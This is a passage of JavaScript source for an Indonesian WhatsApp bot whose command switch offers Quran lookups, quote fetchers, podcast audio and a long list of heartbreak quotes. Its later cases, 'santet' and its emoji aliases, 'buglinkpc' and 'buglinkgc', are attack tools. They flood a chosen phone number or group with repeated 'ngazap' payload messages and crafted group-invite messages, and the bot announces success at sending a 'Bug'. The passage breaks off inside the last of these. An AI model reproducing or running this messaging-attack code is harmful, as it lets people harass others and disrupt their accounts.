Total Ayat : ${ayat}
Ayat Ke : ${ayatke}

Isi Ayat : ${teks}

Latin : ${trans}

Arti Dalam Bahasa Indonesia : ${artiid}

Arti Dalam Bahasa Inggris : ${artien}

Tafsir Surah : ${tafsir}`
await newReply(quran) 
await newReply('Tunggu Sebentar Audio Sedang Dikirim') 
await juna.sendMessage(m.chat, {audio : {url : audio}, mimetype:'audio/mpeg'}, {quoted:m})}catch (error) {
newReply(`Maaf Terjadi Kesalahan`);
}
limitAdd(m.sender, limit)
}
break
case 'randomquran2':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Masukkan Juznya\nContoh : ${prefix+command} 1`) 
try{
let tod = await fetchJson(`https://api.zeeoneofc.my.id/api/islam/randomquran2?juz=${text}&apikey=${setting.BotKey}`)
const audio = tod.result.resources.ayah.audio.primary
const nama = tod.result.resources.nameOfSurah.long
const latin = tod.result.resources.nameOfSurah.transliteration.id
const nomer = tod.result.resources.numberOfSurah
const juz = tod.result.resources.ayah.meta.juz
const ayat = tod.result.resources.totalAyah
const ayatke = tod.result.resources.numberOfAyah
const teks = tod.result.resources.ayah.text.arab
const trans = tod.result.resources.ayah.text.transliteration.en
const artiid = tod.result.resources.ayah.translation.id
const artien = tod.result.resources.ayah.translation.en
const tafsir = tod.result.resources.ayah.tafsir.id.long
var quran = `_*Random Quran*_
Quran : ${nama}
Teks Latin : ${latin}
Surat Ke : ${nomer}
Juz : ${juz}
Total Ayat : ${ayat}
Ayat Ke : ${ayatke}

Isi Ayat : ${teks}

Latin : ${trans}

Arti Dalam Bahasa Indonesia : ${artiid}

Arti Dalam Bahasa Inggris : ${artien}

Tafsir Surah : ${tafsir}`
await newReply(quran) 
await newReply('Tunggu Sebentar Audio Sedang Dikirim') 
await juna.sendMessage(m.chat, {audio : {url : audio}, mimetype:'audio/mpeg'}, {quoted:m})}catch (error) {
newReply(`Maaf Terjadi Kesalahan`);
}
limitAdd(m.sender, limit)
}
break
case 'quranaudio': case 'alquranaudio': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return newReply(`Masukkan Suratnya\nContoh : ${prefix+command} 1\n\nKetik .listsurah Untuk Melihat Daftar Surat`)  
try{
let tod = await fetchJson(`https://api.zenext.xyz/islami/quran/audio/${text}?apikey=${setting.ZenzKey}`)
const audio = tod.result
await newReply('Tunggu Sebentar Audio Sedang Dikirim') 
await juna.sendMessage(m.chat, {audio : {url : audio}, mimetype:'audio/mpeg'}, {quoted:m})}catch (error) {
newReply(`Maaf Terjadi Kesalahan`);
}
limitAdd(m.sender, limit)
}
break
case 'quotesbucin':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.zenext.xyz/randomtext/bucinquote?apikey=${setting.ZenzKey}`)
const bucin = tod.result.message
juna.sendMessage(m.chat, {text: bucin}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'quotesdilan':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.zenext.xyz/randomtext/dilanquote?apikey=${setting.ZenzKey}`)
const dilan = tod.result.message
juna.sendMessage(m.chat, {text: dilan}, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'quotesjawa':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.zenext.xyz/randomtext/jawaquote?apikey=${setting.ZenzKey}`)
const jawa = tod.result.message
juna.sendMessage(m.chat, {text: jawa}, {quoted: m})
}
limitAdd(m.sender, limit)
break
 case 'quotesanime':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let tod = await fetchJson(`https://api.zenext.xyz/randomtext/animequotes?apikey=${setting.ZenzKey}`)
const anime = tod.result.character
const quotes = tod.result.quotes
juna.sendMessage(m.chat, {text: `${quotes}\n\n\n-By ${anime}`}, {quoted: m})
}
limitAdd(m.sender, limit)
 break
case 'podcast': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
await juna.sendPresenceUpdate('recording', m.chat);
list = ['./media/podcast/1.mp3','./media/podcast/2.mp3','./media/podcast/3.mp3','./media/podcast/4.mp3','./media/podcast/5.mp3','./media/podcast/6.mp3','./media/podcast/7.mp3','./media/podcast/8.mp3','./media/podcast/9.mp3']
random = list[Math.floor(Math.random() * list.length)]
podcastnya = fs.readFileSync(random)
juna.sendMessage(m.chat, {audio: podcastnya, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'sadpodcast': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
await juna.sendPresenceUpdate('recording', m.chat);
list = ['./media/sadpodcast/1.mp3','./media/sadpodcast/2.mp3','./media/sadpodcast/3.mp3','./media/sadpodcast/4.mp3','./media/sadpodcast/5.mp3','./media/sadpodcast/6.mp3','./media/sadpodcast/7.mp3']
random = list[Math.floor(Math.random() * list.length)]
sadpodcastnya = fs.readFileSync(random)
juna.sendMessage(m.chat, {audio: sadpodcastnya, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'galau': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const galau = [
  'Gak salah kalo aku lebih berharap sama orang yang lebih pasti tanpa khianati janji-janji',
  'Rasanya baru kemarin kamu menawariku seblak. Lalu entah mengapa hari ini menanyakan kabar pun tidak.\n~vinaa',
  "What's the point of us being close yesterday?\n~Vinaa",
  'Kamu tidak bisa memaksa seseorang untuk menomor satukan dirimu, sebab prioritas dengan kebutuhan itu jelas beda.\n*BY PUTRI*',
  'Hubungan kita hanya sampai dilisan, tidak sampai dipertemukan.\n*BY PUTRI*',
  'Dia sesuka hati, kamu setulus hati.\n*BY PUTRI*',
  'Mengakhiri bukan berarti tidak mau berjuang lagi...hanya saja aku tidak mau ada lgi,hati yg tersakiti.\n\nBy putri',
  'Maaf. Tidak ada waktu untuk meladeni gabutmu. Karena aku sibuk dengan kesibukan ku.\n*BY PUTRI*',
  'Pelangimu mungkin banyak warna. Tapi, tak ada warna yang membuat dia menaruh rasa.\n*BY PUTRI*',
  'Bahagia terus ya,sampai saat ini lu masih jadi tokoh favorit dikisah hidup gue,luv u.\n*BY PUTRI*',
  'Sorry,gue ga kuat buat semuanya ,mksi ya\n\n*BY PUTRI*',
  'Kamu memang sosok yg tak terduga Mudah membuat ku bahagia,mudah membuatku hancur saat itu juga.\n*BY PUTRI*',
  'Harusnya kalo udah ga sayang sama aku tu bilang aja gausa di tutup tutupin\n*BY INDI*',
  'Kalau aku memang tidak sayang sama kamu ngapain aku mikirin kamu. Tapi semuanya kamu yang ngganggap aku gak sayang sama kamu',
  'Jangan iri dan sedih jika kamu tidak memiliki kemampuan seperti yang orang miliki. Yakinlah orang lain juga tidak memiliki kemampuan sepertimu',
  'Hanya kamu yang bisa membuat langkahku terhenti, sambil berkata dalam hati mana bisa aku meninggalkanmu',
  'Tetap tersenyum walaluku masih dibuat menunggu dan rindu olehmu, tapi itu demi kamu',
  'Tak semudah itu melupakanmu',
  'Secuek-cueknya kamu ke aku, aku tetap sayang sama kamu karena kamu telah menerima aku apa adanya',
  'Aku sangat bahagia jika kamu bahagia didekatku, bukan didekatnya',
  'Jadilah diri sendiri, jangan mengikuti orang lain, tetapi tidak sanggup untuk menjalaninya',
  'Cobalah terdiam sejenak untuk memikirkan bagaimana caranya agar kita dapat menyelesaikan masalah ini bersama-sama',
  'Bisakah kita tidak bermusuhan setelah berpisah, aku mau kita seperti dulu sebelum kita jadian yang seru-seruan bareng, bercanda dan yang lainnya',
  'Aku ingin kamu bisa langgeng sama aku dan yang aku harapkan kamu bisa jadi jodohku',
  'Cinta tak bisa dijelaskan dengan kata-kata saja, karena cinta hanya mampu dirasakan oleh hati',
  'Masalah terbesar dalam diri seseorang adalah tak sanggup melawan rasa takutnya',
  'Selamat pagi buat orang yang aku sayang dan orang yang membenciku, semoga hari ini hari yang lebih baik daripada hari kemarin buat aku dan kamu',
  'Jangan menyerah dengan keadaanmu sekarang, optimis karena optimislah yang bikin kita kuat',
  'Kepada pria yang selalu ada di doaku aku mencintaimu dengan tulus apa adanya',
  'Tolong jangan pergi saat aku sudah sangat sayang padamu',
  'Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget',
  'Aku takut kamu kenapa-napa, aku panik jika kamu sakit, itu karena aku cinta dan sayang padamu',
  'Sakit itu ketika cinta yang aku beri tidak kamu hargai',
  'Kamu tiba-tiba berubah tanpa sebab tapi jika memang ada sebabnya kamu berubah tolong katakan biar saya perbaiki kesalahan itu',
  'Karenamu aku jadi tau cinta yang sesungguhnya',
  'Senyum manismu sangatlah indah, jadi janganlah sampai kamu bersedih',
  'Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai',
  'Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa',
  'Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis',
  'Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa',
  'Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama',
  'Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan',
  'Aku tak menyangka kamu pergi dan melupakan ku begitu cepat',
  'Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa',
  'Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku',
  'Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia',
  'Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali',
  'Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu',
  'Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu',
  'Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri',
  'Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku',
  'Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka',
  'Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu',
  'Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan',
  'Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina',
  'Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri',
  'Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja',
  'Aku berdiri disini sendiri menunggu kehadiran dirimu',
  'Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran',
  'Maaf aku lupa ternyata aku bukan siapa-siapa',
  'Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu',
  'Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku',
  'Jangan buat aku terlalu berharap jika kamu tidak menginginkanku',
  'Lebih baik sendiri daripada berdua tapi tanpa kepastian',
  'Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri',
  'Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar',
  'Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi',
  'Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki',
  'Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu',
  'Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau',
  'Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa',
  'Aku bukan mencari yang sempurna tapi yang terbaik untukku',
  'Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan',
  'Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka',
  'Terima kasih karena kamu aku menjadi lupa tentang masa laluku',
  'Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja',
  'Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati',
  'Mikirin orang yang gak pernah mikirin kita itu emang bikin gila',
  'Dari sekian lama menunggu apa yang sudah didapat',
  'Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali',
  'Yang sendiri adalah yang bersabar menunggu pasangan sejatinya',
  'Aku terlahir sederhana dan ditinggal sudah biasa',
  'Aku sayang kamu tapi aku masih takut untuk mencintaimu',
  'Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia',
  'Aku tidak pernah berpikir kamu akan menjadi yang sementara',
  'Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah',
  'Jangan paksa aku menjadi cewek seperti seleramu',
  'Hanya yang sabar yang mampu melewati semua kekecewaan',
  'Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri',
  'Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu',
  'Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu',
  'Punya kalimat sendiri & mau ditambahin? chat *.owner*'
]
const galaunya = galau[Math.floor(Math.random() * galau.length)]
newReply(`${galaunya}`)
backsoundnya = fs.readFileSync('./media/sound/galau.mp3')
juna.sendMessage(m.chat, {audio: backsoundnya, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
limitAdd(m.sender, limit)
break
case 'santet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': {
 if (!isCreator) return newReply('Khusus Premium!')
if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285600793871`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
if (args[0].startsWith(`6285600793871`)) return newReply('Ngapain Mau Kirim Ke Owner? Lu Mau Gw Spam?')
newReply('Prosess Bosku') 
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
juna.sendMessage(Pe, {text: `${ngazap(prefix)}`}, {quoted:junaa})
await sleep(2000)
}
newReply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
case "buglinkpc":
if (!isCreator) return newReply ('Khusus Premium!') 
if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285600793871`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
if (args[0].startsWith(`6285600793871`)) return newReply('Ngapain Mau Kirim Ke Creator Gw? Lu Mau Gw Spam?')
newReply('Proses') 
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "6288239620884-1626256984@g.us",
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": "166659839399999",
"groupName": `𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️${ngazap(prefix)}`,
"jpegThumbnail": "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",
"caption": `*https://wa.me/settings*\n𝙅𝙪𝙣𝙖𝘽𝙤𝙩-𝙈𝙙 ${ngazap(prefix)}`,
}
}), { userJid: m.chat, quoted: m })
juna.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
}
newReply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
break
case "buglinkgc":
if (!isCreator) return newReply ('Khusus Premium!') 
if (!args[0]) return newReply(`Penggunaan ${prefix+command} id group\nContoh ${prefix+command} 12036316943016488`)
newReply('Proses') 
bnnd = text.split("|")[0]+'@g.us'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "6288239620884-1626256984@g.us",
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": "166659839399999",
